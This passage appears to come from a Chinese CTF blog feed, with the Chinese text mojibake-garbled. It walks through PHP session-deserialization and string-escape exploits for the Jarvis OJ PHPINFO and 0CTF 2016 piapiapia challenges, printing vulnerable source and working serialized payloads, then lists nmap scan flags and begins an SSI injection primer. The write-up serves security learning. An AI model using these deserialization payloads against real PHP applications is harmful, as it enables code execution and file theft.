ç®€å•è¯´æ¥ï¼Œå°±æ˜¯æˆ‘ä»¬è¦æ„å»ºä¸€ä¸ªè¡¨å•ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸session.upload_process.nameåŒåçš„å˜é‡ï¼Œåç«¯ä¼šè‡ªåŠ¨å°†POSTçš„è¿™ä¸ªåŒåå˜é‡ä½œä¸ºé”®è¿›è¡Œåºåˆ—åŒ–ç„¶åå­˜å‚¨åˆ°sessionæ–‡ä»¶ä¸­ï¼Œä¸‹æ¬¡è¯·æ±‚å°±ä¼šååºåˆ—åŒ–Sessionã€‚ é‚£ä¹ˆæˆ‘ä»¬æ„å»ºå¦‚ä¸‹è¡¨å•ï¼š 12345&lt;form action=&quot;http://xx.xx.xx.xx&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; ã€Jarvis OJã€‘PHPINFOè¯´é‚£ä¹ˆå¤šè¿˜æ˜¯ç›´æ¥çœ‹é¢˜å§ï¼ŒæŸ¥çœ‹æºç ï¼š 12345678910111213141516171819202122232425&lt;?php//A webshell is wait for youini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);session_start();class OowoO&#123; public $mdzz; function __construct() &#123; $this-&gt;mdzz = &#x27;phpinfo();&#x27;; &#125; function __destruct() &#123; eval($this-&gt;mdzz); &#125;&#125;if(isset($_GET[&#x27;phpinfo&#x27;]))&#123; $m = new OowoO();&#125;else&#123; highlight_string(file_get_contents(&#x27;index.php&#x27;));&#125;?&gt; æ¯”èµ·popé“¾è¿™ç§çœ‹èµ·æ¥å°±ç®€å•æ¸…æ™°å¤šäº†ï¼Œå½“æˆ‘ä»¬éšä¾¿è¾“å…¥ä¸€ä¸ªå€¼æ˜¯å°±ä¼šè§¦å‘__construct()é­”æœ¯æ–¹æ³•ï¼Œæ‰§è¡Œphpinfoã€‚æŸ¥çœ‹é¡µé¢å‘ç°å­˜åœ¨ä¹‹å‰æåˆ°çš„é‚£ä¸ªé—®é¢˜ï¼Œå› æ­¤ä¾ç„¶æ˜¯Sessionååºåˆ—åŒ–ã€‚ è€Œè¿™ä¸ªååºåˆ—åŒ–çš„é€»è¾‘ä¹Ÿæ˜¯ååˆ†ç®€å•çš„ï¼Œç›¸å½“äºå°±æ˜¯æ‰§è¡Œmdzzçš„è¯­å¥ï¼Œå› æ­¤æˆ‘ä»¬å°†phpinfo();æ›¿æ¢ä¸ºprint_r(scandir(dirname(__FILE__)));ï¼Œæ‰§è¡Œåºåˆ—åŒ–ï¼Œå¾—åˆ°payloadï¼Œè®°å¾—è¦åŠ ä¸Š|ï¼Œç”¨åæ–œæ é˜²æ­¢è½¬ä¹‰ï¼š 1|O:5:\\&quot;OowoO\\&quot;:1:&#123;s:4:\\&quot;mdzz\\&quot;;s:36:\\&quot;print_r(scandir(dirname(__FILE__)));\\&quot;;&#125; ç„¶åå°†ä¹‹å‰é‚£ä¸ªè¡¨å•ä¿å­˜ä¸ºhtmlæ ¼å¼ï¼Œéšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åæŠ“åŒ…å°†æ–‡ä»¶å†…å®¹æ”¹ä¸ºpayloadï¼Œç„¶åçœ‹åˆ°flagæ–‡ä»¶ï¼Œå»phpinfoä¸­çš„SCRIPT_FILENAMEéƒ¨åˆ†æŸ¥çœ‹åŒ…å«å½“å‰è¿è¡Œè„šæœ¬çš„è·¯å¾„ï¼Œç„¶åç”¨file_get_contents()è¯»å–å°±å¯ä»¥äº†ã€‚ ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²é€ƒé€¸ååºåˆ—åŒ–åŸºæœ¬çŸ¥è¯†åœ¨ç†è§£å­—ç¬¦ä¸²é€ƒé€¸ä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»å¯¹ååºåˆ—åŒ–æœ‰ä¸€ä¸ªå‰ç½®çŸ¥è¯†çš„äº†è§£ï¼Œä¸è¿‡è¿™äº›å†…å®¹æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œå› æ­¤å°±å¤§è‡´è¯´ä¸€ä¸‹ã€‚ ç¬¬ä¸€ï¼Œphpååºåˆ—åŒ–ä»¥;&#125;ä¸ºç»“å°¾ï¼Œå¹¶ä¸”æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹ã€‚ æ¯”å¦‚æˆ‘ä»¬æ„é€ è¿™æ ·ä¸€ä¸ªåºåˆ—åŒ–å†…å®¹è¿›è¡Œååºåˆ—åŒ–ï¼š 1O:6:&quot;hacker&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;mrl64&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;s:5:&quot;pass2&quot;;s:6:&quot;123457&quot; ååºåˆ—åŒ–å‡ºçš„å†…å®¹ï¼š 12345678class __PHP_Incomplete_Class#1 (3) &#123; public $__PHP_Incomplete_Class_Name =&gt; string(6) &quot;hacker&quot; public $name =&gt; string(5) &quot;mrl64&quot; public $pass =&gt; string(6) &quot;123456&quot;&#125; å¯ä»¥çœ‹å‡ºç»“æŸåé¢éƒ¨åˆ†çš„å†…å®¹æ˜¯ä¸ä¼šè¯»å–çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æå‰é—­åˆåºåˆ—åŒ–å†…å®¹ä½¿åé¢çš„éƒ¨åˆ†ä¸¢å¼ƒã€‚ ç¬¬äºŒï¼Œé•¿åº¦ä¸å¯¹åº”ä¼šè¿”å›bool(false) è¿™ä¸ªå°±æ¯”è¾ƒå¥½ç†è§£äº†ï¼Œä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåå¤å¼ºè°ƒè¦å¯¹åº”é•¿åº¦ï¼Œæˆ‘ä»¬å°†ä¸‹é¢è¿™ä¸ªpayloadè¿›è¡Œååºåˆ—åŒ–ï¼š 1O:6:&quot;hacker&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;mrl64&quot;;s:4:&quot;pass&quot;;s:7:&quot;123456&quot;;&#125; è¿”å›bool(false) ç¬¬ä¸‰ï¼Œç›¸å½“é‡è¦çš„ä¸€ç‚¹ï¼Œååºåˆ—åŒ–å¯ä»¥ååºåˆ—ç±»ä¸­ä¸å­˜åœ¨çš„å…ƒç´  ä¾‹å¦‚æˆ‘ä»¬çš„ç±»æ˜¯è¿™æ ·çš„ï¼š 1234class hacker&#123; public $name=&#x27;mrl64&#x27;; public $pass=&#x27;123456&#x27;;&#125; ä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ„å»ºå¦‚ä¸‹çš„payloadï¼š 1O:6:&quot;hacker&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;mrl64&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;s:3:&quot;age&quot;;s:4:&quot;2333&quot;;&#125; å°†å…¶ååºåˆ—åŒ–å¯ä»¥å‘ç°ï¼Œageä¾ç„¶æˆåŠŸååºåˆ—åŒ–å‡ºæ¥äº†ï¼š 12345678910class __PHP_Incomplete_Class#1 (4) &#123; public $__PHP_Incomplete_Class_Name =&gt; string(6) &quot;hacker&quot; public $name =&gt; string(5) &quot;mrl64&quot; public $pass =&gt; string(6) &quot;123456&quot; public $age =&gt; string(4) &quot;2333&quot;&#125; æœ‰äº†è¿™äº›çŸ¥è¯†ï¼Œæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹æ„é€ å­—ç¬¦ä¸²é€ƒé€¸ç›¸å…³çš„payloadäº†ã€‚ å¦‚ä½•æ„å»ºå­—ç¬¦ä¸²é€ƒé€¸é¦–å…ˆæˆ‘ä»¬è¦æ˜ç™½ä¸€ç‚¹ï¼Œå­—ç¬¦ä¸²é€ƒé€¸çš„æœ¬è´¨å°±æ˜¯æ”¹å˜åºåˆ—åŒ–çš„é•¿åº¦ï¼Œæ— è®ºæ˜¯å˜é•¿è¿˜æ˜¯å˜çŸ­ï¼Œæœ€ç»ˆçš„è¢«ç›®çš„å°±æ˜¯ä¸ºäº†ç»•è¿‡ä¸€äº›wafã€‚ æ ¸å¿ƒå…¶å®éƒ½æ˜¯ä¸€æ ·çš„ï¼Œé€šè¿‡é¢˜ç›®æ¼æ´æ„å»ºpayloadä½¿ä¸€äº›éƒ¨åˆ†ç”±äºåºåˆ—åŒ–çš„é•¿åº¦è¢«è¯†åˆ«ä¸ºé”®åï¼Œä»è€Œè¿›è¡Œç»•è¿‡ã€‚è¿™æ ·è¯´æ¯”è¾ƒæŠ½è±¡ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ç”¨ä¸€é“é¢˜è®¤è¯†æ”¹å˜å­—ç¬¦ä¸²é•¿åº¦å¯¼è‡´çš„çš„å­—ç¬¦ä¸²é€ƒé€¸ã€‚ [0CTF 2016]piapiapiaè¿›å…¥ç½‘é¡µå•¥ä¹Ÿæ²¡å‘ç°ï¼Œæµ‹è¯•äº†ä¸‹ç™»å½•æ¡†ä¹Ÿä¸å­˜åœ¨sqlã€sstiç­‰æ³¨å…¥ï¼Œå› æ­¤æ‰«æç›®å½•ï¼Œå‘ç°www.zipï¼Œä¸‹è½½ã€‚ è¿™ä¸ªä»£ç å®¡è®¡é‡æœ‰ç‚¹å¤§ï¼Œé¦–å…ˆæ˜¯æ³¨å†Œå’Œç™»å½•ï¼Œè¿™ä¸ªæ¯”è¾ƒç®€å•ï¼ŒåŸºæœ¬æ²¡å•¥é™åˆ¶ï¼Œå› æ­¤å…ˆæ³¨å†Œç™»å½•ä¸€ä¸ªè´¦å·ã€‚æ¥ç€æ˜¯config.phpï¼Œå‘ç°flagå†…å®¹å­˜åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œé¢ï¼Œå› æ­¤è¦æƒ³åŠæ³•è¯»å–ã€‚ æ¥ç€å°±æ˜¯ä¸‰ä¸ªé‡ç‚¹æ–‡ä»¶äº†ï¼Œé¦–å…ˆæ˜¯ç™»å½•æˆåŠŸåçš„update.phpï¼š 1234567891011121314151617181920212223242526272829303132&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login First&#x27;); &#125; if($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123; $username = $_SESSION[&#x27;username&#x27;]; if(!preg_match(&#x27;/^\\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;])) die(&#x27;Invalid phone&#x27;); if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;])) die(&#x27;Invalid email&#x27;); if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;); $file = $_FILES[&#x27;photo&#x27;]; if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000) die(&#x27;Photo size error&#x27;); move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;])); $profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;]; $profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;]; $profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;]; $profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]); $user-&gt;update_profile($username, serialize($profile)); echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;; &#125; else &#123;?&gt; åŒ¹é…æ˜¯å¦éƒ½æœ‰ä¼ å€¼ï¼Œå¹¶ä¸”å¯¹ä¼ å…¥çš„å€¼éƒ½è¿›è¡Œäº†ä¸¥æ ¼çš„æ­£åˆ™åŒ¹é…ä¸é•¿åº¦é™åˆ¶ï¼Œæœ€åå¯¹æˆ‘ä»¬ä¼ å…¥çš„æ–‡ä»¶å†…å®¹è¿›è¡Œåºåˆ—åŒ–ã€‚è€Œæˆ‘ä»¬å‘ç°è¿™ä¸ªphpæ–‡ä»¶åŒ…å«äº†class.phpï¼Œç»§ç»­å®¡è®¡ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100&lt;?phprequire(&#x27;config.php&#x27;);class user extends mysql&#123; private $table = &#x27;users&#x27;; public function is_exists($username) &#123; $username = parent::filter($username); $where = &quot;username = &#x27;$username&#x27;&quot;;an return parent::select($this-&gt;table, $where); &#125; public function register($username, $password) &#123; $username = parent::filter($username); $password = parent::filter($password); $key_list = Array(&#x27;username&#x27;, &#x27;password&#x27;); $value_list = Array($username, md5($password)); return parent::insert($this-&gt;table, $key_list, $value_list); &#125; public function login($username, $password) &#123; $username = parent::filter($username); $password = parent::filter($password); $where = &quot;username = &#x27;$username&#x27;&quot;; $object = parent::select($this-&gt;table, $where); if ($object &amp;&amp; $object-&gt;password === md5($password)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function show_profile($username) &#123; $username = parent::filter($username); $where = &quot;username = &#x27;$username&#x27;&quot;; $object = parent::select($this-&gt;table, $where); return $object-&gt;profile; &#125; public function update_profile($username, $new_profile) &#123; $username = parent::filter($username); $new_profile = parent::filter($new_profile); $where = &quot;username = &#x27;$username&#x27;&quot;; return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where); &#125; public function __tostring() &#123; return __class__; &#125;&#125;class mysql &#123; private $link = null; public function connect($config) &#123; $this-&gt;link = mysql_connect( $config[&#x27;hostname&#x27;], $config[&#x27;username&#x27;], $config[&#x27;password&#x27;] ); mysql_select_db($config[&#x27;database&#x27;]); mysql_query(&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;); return $this-&gt;link; &#125; public function select($table, $where, $ret = &#x27;*&#x27;) &#123; $sql = &quot;SELECT $ret FROM $table WHERE $where&quot;; $result = mysql_query($sql, $this-&gt;link); return mysql_fetch_object($result); &#125; public function insert($table, $key_list, $value_list) &#123; $key = implode(&#x27;,&#x27;, $key_list); $value = &#x27;\\&#x27;&#x27; . implode(&#x27;\\&#x27;,\\&#x27;&#x27;, $value_list) . &#x27;\\&#x27;&#x27;; $sql = &quot;INSERT INTO $table ($key) VALUES ($value)&quot;; return mysql_query($sql); &#125; public function update($table, $key, $value, $where) &#123; $sql = &quot;UPDATE $table SET $key = &#x27;$value&#x27; WHERE $where&quot;; return mysql_query($sql); &#125; public function filter($string) &#123; $escape = array(&#x27;\\&#x27;&#x27;, &#x27;\\\\\\\\&#x27;); $escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;; $string = preg_replace($escape, &#x27;_&#x27;, $string); $safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;); $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;; return preg_replace($safe, &#x27;hacker&#x27;, $string); &#125; public function __tostring() &#123; return __class__; &#125;&#125;session_start();$user = new user();$user-&gt;connect($config); å¥½é•¿çš„ç±»ï¼Œä¸€å¤§å †å‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬æ³¨æ„åˆ°filterä¸­å°†â€™selectâ€™, â€˜insertâ€™, â€˜updateâ€™, â€˜deleteâ€™, â€˜whereâ€™å…¨éƒ¨æ›¿æ¢æˆäº†â€™hackerâ€™ï¼Œè¿™ä¸ªç‚¹ä¹‹åå¯ä»¥ç”¨æ¥åˆ©ç”¨ã€‚ æœ€åæ˜¯å­˜åœ¨ååºåˆ—åŒ–çš„profile.phpæ–‡ä»¶ï¼š 1234567891011121314151617&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login First&#x27;); &#125; $username = $_SESSION[&#x27;username&#x27;]; $profile=$user-&gt;show_profile($username); if($profile == null) &#123; header(&#x27;Location: update.php&#x27;); &#125; else &#123; $profile = unserialize($profile); $phone = $profile[&#x27;phone&#x27;]; $email = $profile[&#x27;email&#x27;]; $nickname = $profile[&#x27;nickname&#x27;]; $photo = base64_encode(file_get_contents($profile[&#x27;photo&#x27;]));?&gt; æœ€åè¿™ä¸ªæ–‡ä»¶å°±æ˜¯è¯»å–äº†ï¼Œç”¨base64ç¼–ç å¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œäº†è¯»å–å’Œæ˜¾ç¤ºã€‚çœ‹å®Œä»£ç ï¼Œæˆ‘ä»¬çŸ¥é“æˆ‘ä»¬è¦è¯»å–config.phpä¸­çš„flagæ•°æ®ã€‚è€Œè¯»å–æ•°æ®çš„ä½ç½®åœ¨photoé‚£é‡Œï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å¢åŠ payloadçš„é•¿åº¦ä½¿å¾—config.phpçš„ä½ç½®è¢«æŒ¤åˆ°photoçš„ä½ç½®ä¸Šã€‚ é¦–å…ˆæ„å»ºåºåˆ—åŒ–ï¼š 1234567&lt;?php$profile[&#x27;phone&#x27;]=&#x27;12312312312&#x27;;$profile[&#x27;email&#x27;]=&#x27;mrl64@163.com&#x27;;$profile[&#x27;nickname&#x27;]=[&#x27;halo&#x27;]; //æ•°ç»„ç»•è¿‡é•¿åº¦é™åˆ¶$profile[&#x27;photo&#x27;]=&#x27;config.php&#x27;;echo serialize($profile);?&gt; payloadï¼š 1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12312312312&quot;;s:5:&quot;email&quot;;s:13:&quot;mrl64@163.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:4:&quot;halo&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; PHPåœ¨ååºåˆ—åŒ–æ—¶ï¼Œä»å·¦å¾€å³è¯»å–æ•°æ®ç±»å‹åŠé•¿åº¦ï¼Œä¸”åªè¯»å–å…¶ä¸­è§„å®šé•¿åº¦çš„æ•°æ®ï¼Œå³å½“æ•°æ®çš„é•¿åº¦å¤§äºè§„å®šçš„é•¿åº¦ï¼Œåé¢è¿˜æœ‰æ•°æ®ä¹Ÿä¸å†è¯»å–ï¼Œè€Œåé¢ä¸å†è¯»å–çš„æ•°æ®ï¼Œå°±ä¼šè¢«æŒ¤åˆ°ä¸‹ä¸€ä¸ªæ•°æ®é¡¹ä¸­ã€‚ è¿™é‡Œéœ€è¦æ„é€ è¶…å‡ºé•¿åº¦çš„æ•°æ®ï¼Œå°†è¢«æŒ¤å‡ºæ¥çš„æ•°æ®å½¢æˆå¯ä»¥è¯»å–config.php çš„æ•°æ®é¡¹ã€‚é¦–å…ˆæœ€åä¸€ä¸ªéƒ¨åˆ†çš„payload: 1&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; æ€»å…±æœ‰34ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬è¦è®©è¿™äº›å­—ç¬¦é€ƒé€¸å‡ºæ¥ï¼Œå°±å¿…é¡»è®©nicknameéƒ¨åˆ†å¤šå‡º34ä¸ªå­—ç¬¦ï¼Œè¿™æ ·æˆ‘ä»¬æœ€åéƒ¨åˆ†çš„payloadè¢«è¯»è¿›nicknameï¼Œæ—¢ç„¶ä»nicknameé€ƒé€¸å‡º&quot;;&#125;ï¼Œå°†å‰é¢çš„nicknameæ•°ç»„é—­åˆä¹‹åï¼Œå‰©ä¸‹çš„s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;å°±ä¼šè¢«å½“ä½œphotoçš„éƒ¨åˆ†äº†ã€‚ æˆ‘ä»¬å‘ç°whereä¼šè¢«æ›¿æ¢æˆhackerï¼Œå› æ­¤æ¯æ›¿æ¢ä¸€æ¬¡å°±ä¼šä½¿é•¿åº¦å¢åŠ ä¸€ä½ï¼Œ34ä¸ªwhereå°±ä¼šå¢åŠ 34ä½ã€‚æœ€åpayloadï¼Œå°†nicknameç±»å‹æ”¹ä¸ºæ•°ç»„å¹¶å°†å†…å®¹æ”¹ä¸ºpayloadï¼š 1wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125; è¿‡ç¨‹å¦‚ä¸‹ï¼š åˆšå¼€å§‹ä¼ å…¥:1a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12312312312&quot;;s:5:&quot;email&quot;;s:13:&quot;mrl64@163.com&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:204:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/07cc694b9b3fc636710fa08b6922c42b&quot;;&#125; æ­¤æ—¶&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;è¿™äº›éƒ¨åˆ†éƒ½æ˜¯nicknameçš„ä¸€éƒ¨åˆ† æ¥ç€è¿›è¡Œæ­£åˆ™æ›¿æ¢åï¼Œwhereè¢«æ›¿æ¢ä¸ºhackerï¼Œå¯¼è‡´å†è¯»å–å®Œç¬¬34ä¸ªhackerä¹‹åå°±åœæ­¢è¯»å–äº†ï¼Œè€Œs:5:&quot;photo&quot;;s:10:&quot;config.php&quot;å°±æ›¿ä»£äº†åŸæ¥uploadçš„åœ°ä½ï¼Œå°±æ˜¯photoéƒ¨åˆ†ï¼Œè€Œç”±äºæœ€åçš„&quot;;&#125;ï¼Œå¯¼è‡´ååºåˆ—åŒ–æå‰ç»“æŸï¼ŒåŸæ¥çš„uploadä¸è¢«æ‰§è¡Œã€‚ ä¸Šä¼ ï¼Œç„¶åæŠ“åŒ…ï¼ŒæŠŠnicknameæ”¹ä¸ºæ•°ç»„ç»•è¿‡ï¼Œè§£base64å¾—åˆ°flagã€‚ æ€»ç»“æœ€è¿‘åº”è¯¥æ˜¯æ­»ç£•ååºåˆ—åŒ–è¿™ä¸€å—äº†ï¼Œå…ˆæŠŠæ¬¢ä¹æ–°æ˜¥èµ›é‚£é¢˜å†™äº†ï¼Œæ¥ç€é‡ç‚¹åˆ·popï¼Œå¹¶ä¸”å­¦ä¹ åŸç”Ÿç±»åº”ç”¨ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -php","slug":"web-php","permalink":"http://example.com/tags/web-php/"}]},{"title":"nmapçš„ä½¿ç”¨åŠssiæ³¨å…¥","slug":"nmapçš„ä½¿ç”¨åŠssiæ³¨å…¥","date":"2022-02-25T07:07:43.000Z","updated":"2022-02-25T12:09:49.368Z","comments":true,"path":"2022/02/25/nmapçš„ä½¿ç”¨åŠssiæ³¨å…¥/","link":"","permalink":"http://example.com/2022/02/25/nmap%E7%9A%84%E4%BD%BF%E7%94%A8%E5%8F%8Assi%E6%B3%A8%E5%85%A5/","excerpt":"å‰è¨€ æ˜¨å¤©æŒ–çš„å‘ä»Šå¤©å°±å¡«ï¼Œé¡ºä¾¿ä¹Ÿè®°å½•ä¸‹nmapçš„ä½¿ç”¨ä»ï¼Œæ¯•ç«Ÿssiæœ‰æ—¶å€™ä¹Ÿè¦æ­é…nmapæ‰«æçš„ã€‚","text":"å‰è¨€ æ˜¨å¤©æŒ–çš„å‘ä»Šå¤©å°±å¡«ï¼Œé¡ºä¾¿ä¹Ÿè®°å½•ä¸‹nmapçš„ä½¿ç”¨ä»ï¼Œæ¯•ç«Ÿssiæœ‰æ—¶å€™ä¹Ÿè¦æ­é…nmapæ‰«æçš„ã€‚ Nmapä½¿ç”¨Nmapä½œä¸ºä¸€ä¸ªå¼ºå¤§çš„ä¸»æœºæ‰«æå·¥å…·ï¼Œåœ¨æ£€æµ‹ä¸»æœºã€ç«¯å£ç­‰æ–¹é¢æœ‰ç€ç›¸å½“å¼ºå¤§çš„åŠŸèƒ½ã€‚è¿™é‡Œè®°å½•ä¸‹å¸¸ç”¨çš„æŒ‡ä»¤ï¼Œåœ¨æ­£å¼ä½¿ç”¨æ—¶ä¸ºäº†ç»•è¿‡å¾€å¾€éœ€è¦å¤šæ¡æŒ‡ä»¤è”åˆä½¿ç”¨ã€‚ è¯¦ç»†ä½¿ç”¨æ–¹æ³•å¯ä»¥å‚è€ƒä¸‹é¢å‡ ç¯‡åšå®¢ï¼šæ‰«æå·¥å…·â€”â€”Nmapç”¨æ³•è¯¦è§£Nmapçš„ä½¿ç”¨æ–¹æ³•æ€»ç»“ ä¸»æœºå‘ç° -sLï¼šåˆ—è¡¨æ‰«æï¼Œä»…åˆ—ä¸¾åˆ¶å®šç›®æ ‡çš„IPï¼Œä¸è¿›è¡Œä¸»æœºå‘ç° -snï¼šè¿›è¡Œä¸»æœºå‘ç°ï¼Œä¸è¿›è¡Œç«¯å£æ‰«æ -n/-Rï¼šä¸è¿›è¡Œ/è¿›è¡ŒDNSè§£æ -Pnï¼šépingæ‰«æï¼Œä¸è¿›è¡Œä¸»æœºå‘ç°ï¼Œå¸¸ç”¨æ¥ç»•è¿‡é˜²ç«å¢™ â€“tracerouteï¼šè¿½è¸ªæ¯ä¸ªè·¯ç”±èŠ‚ç‚¹ -PA/-PS/-PU/-PYï¼šä½¿ç”¨TCP ACK/SYN/æˆ–SCTP INIT/ECHOæ–¹å¼æ¥å‘ç°ä¸»æœº -sPï¼šæ‰«æä¸€ä¸ªæ®µçš„ä¸»æœºåœ¨çº¿çŠ¶å†µ -Oï¼šæ“ä½œç³»ç»Ÿæ£€æµ‹ ç«¯å£æ‰«æ -sS/sT/sA/sW/sM:æŒ‡å®šä½¿ç”¨ TCP SYN/Connect()/ACK/Window/Maimon scansçš„æ–¹å¼æ¥å¯¹ç›®æ ‡ä¸»æœºè¿›è¡Œæ‰«æã€‚ -sU: æŒ‡å®šä½¿ç”¨UDPæ‰«ææ–¹å¼ç¡®å®šç›®æ ‡ä¸»æœºçš„UDPç«¯å£çŠ¶å†µã€‚ -sN/sF/sX: æŒ‡å®šä½¿ç”¨TCP Null, FIN, and Xmas scansç§˜å¯†æ‰«ææ–¹å¼æ¥ååŠ©æ¢æµ‹å¯¹æ–¹çš„TCPç«¯å£çŠ¶æ€ã€‚ -pï¼šè‡ªå®šä¹‰ç«¯å£æ‰«æï¼Œå¯ä»¥æŒ‡å®šç«¯å£èŒƒå›´æˆ–æŒ‡å®šç«¯å£ -sV/-vvï¼šæ¢æµ‹æ‰“å¼€ç«¯å£å¯¹åº”æœåŠ¡çš„ç‰ˆæœ¬ä¿¡æ¯/è¯¦ç»†è¾“å‡ºæ‰«æç»“æœï¼ŒåŒ…å«å¼€æ”¾ç«¯å£ï¼Œæ‰«ææ–¹æ³•ï¼Œç«¯å£å¯¹åº”æœåŠ¡åè®®ç­‰ -Aï¼šä¸‡èƒ½å¼€å…³æ‰«æï¼ŒåŒ…å«äº†1-10000ç«¯å£pingæ‰«æï¼Œæ“ä½œç³»ç»Ÿæ‰«æï¼Œè„šæœ¬æ‰«æï¼Œè·¯ç”±è·Ÿè¸ªï¼ŒæœåŠ¡æ¢æµ‹ SSIæ³¨å…¥ä»€ä¹ˆæ˜¯ssiSSI(Server-Side Includes Injection)ï¼Œå³æœåŠ¡ç«¯åŒ…å«æ³¨å…¥ã€‚SSIæ³¨å…¥å…è®¸è¿œç¨‹åœ¨ Web åº”ç”¨ä¸­æ³¨å…¥è„šæœ¬æ¥æ‰§è¡Œä»£ç ã€‚ SSIæ˜¯åµŒå…¥HTMLé¡µé¢ä¸­çš„æŒ‡ä»¤ï¼Œåœ¨é¡µé¢è¢«æä¾›æ—¶ç”±æœåŠ¡å™¨è¿›è¡Œè¿ç®—ï¼Œä»¥å¯¹ç°æœ‰HTMLé¡µé¢å¢åŠ åŠ¨æ€ç”Ÿæˆçš„å†…å®¹ï¼Œè€Œæ— é¡»é€šè¿‡CGIç¨‹åºæä¾›å…¶æ•´ä¸ªé¡µé¢ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–åŠ¨æ€æŠ€æœ¯ã€‚ ä»æŠ€æœ¯è§’åº¦ä¸Šæ¥è¯´ï¼ŒSSIå°±æ˜¯åœ¨HTMLæ–‡ä»¶ä¸­ï¼Œå¯ä»¥é€šè¿‡æ³¨é‡Šè¡Œè°ƒç”¨çš„å‘½ä»¤æˆ–æŒ‡é’ˆï¼Œå³å…è®¸é€šè¿‡åœ¨HTMLé¡µé¢æ³¨å…¥è„šæœ¬æˆ–è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚ ssiè¯­æ³• æ˜¾ç¤ºæœåŠ¡å™¨ç«¯ç¯å¢ƒå˜é‡&lt;#echo&gt; 12&lt;! #echo var=&quot;REMOTE_ADDR&quot;â€“&gt; //æ˜¾ç¤ºIP&lt;!â€“#echo var=&quot;DOCUMENT_NAME&quot;â€“&gt; //æ˜¾ç¤ºæœ¬æ–‡æ¡£åç§° å°†æ–‡æœ¬å†…å®¹ç›´æ¥æ’å…¥åˆ°æ–‡æ¡£ä¸­&lt;#include&gt; 123&lt;! #include 